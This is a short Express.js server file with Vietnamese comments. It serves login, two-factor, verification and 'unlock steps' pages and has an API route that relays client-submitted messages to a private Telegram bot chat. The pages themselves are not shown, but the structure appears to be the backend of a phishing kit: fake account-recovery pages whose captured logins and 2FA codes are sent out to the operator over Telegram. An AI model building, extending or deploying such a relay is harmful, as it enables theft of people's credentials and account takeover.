require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware để xử lý JSON body từ các yêu cầu
app.use(express.json());

// --- Định tuyến các URL thân thiện ---
// Các route này PHẢI được đặt TRƯỚC app.use(express.static(...))
// để Express ưu tiên xử lý các đường dẫn cụ thể trước khi tìm kiếm file tĩnh.

// Trang chủ (index.html) -> /
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Trang đăng nhập (login_page.html) -> /login
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login_page.html'));
});

// Trang xác thực 2 yếu tố (2fa_page.html) -> /complete
app.get('/complete', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '2fa_page.html'));
});

// Trang xác minh (verification.html) -> /verification
app.get('/verification', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verification.html'));
});

// Trang bước mở khóa (unlock_steps.html) -> /unlock_steps
app.get('/unlock_steps', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'unlock_steps.html'));
});

// Phục vụ các file tĩnh từ thư mục 'public'
// Nếu một URL không khớp với các định tuyến ở trên, Express sẽ tìm kiếm file trong thư mục 'public'.
// Ví dụ: /styles.css sẽ được phục vụ từ public/styles.css
app.use(express.static(path.join(__dirname, 'public')));


// --- Telegram Proxy Endpoint ---
// Xử lý yêu cầu gửi tin nhắn đến Telegram API
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { message } = req.body;
        
        // Kiểm tra xem token và chat ID đã được cấu hình trong .env chưa
        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
            console.error('ERROR: Telegram bot token or chat ID is not configured in .env');
            return res.status(500).json({ success: false, error: 'Telegram API credentials missing.' });
        }

        // Gửi yêu cầu POST đến Telegram Bot API
        const response = await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML' // Định dạng tin nhắn là HTML
            }
        );
        
        // Trả về phản hồi thành công
        res.json({ success: true, telegramResponse: response.data });
    } catch (error) {
        // Ghi log lỗi chi tiết hơn từ Telegram API
        console.error('Telegram API Error:', error.response?.data?.description || error.message);
        res.status(500).json({ 
            success: false,
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message // Cung cấp chi tiết lỗi cho client
        });
    }
});

// --- Xử lý 404 Not Found ---
// Route này sẽ bắt tất cả các yêu cầu không khớp với bất kỳ route nào được định nghĩa ở trên.
app.use((req, res) => {
    console.log(`WARN: 404 Not Found for URL: ${req.originalUrl}`);
    res.status(404).send('404 Not Found: The requested page could not be found.');
});

// --- Khởi động server ---
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Application accessible at: http://localhost:${PORT}/`);
    console.log(`Friendly URLs configured:`);
    console.log(` - /login -> login_page.html`);
    console.log(` - /complete -> 2fa_page.html`);
    console.log(` - /verification -> verification.html`);
    console.log(` - /unlock_steps -> unlock_steps.html`);
    console.log(` - / -> index.html`);
});
